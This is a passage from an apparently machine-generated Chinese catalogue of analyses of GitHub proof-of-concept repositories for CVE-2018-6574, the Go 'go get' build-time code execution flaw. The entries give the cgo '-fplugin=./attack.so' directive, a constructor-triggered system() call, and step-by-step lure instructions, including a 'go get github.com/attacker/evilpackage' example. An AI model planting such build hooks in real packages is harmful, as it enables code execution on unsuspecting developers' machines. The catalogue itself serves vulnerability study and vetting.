*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

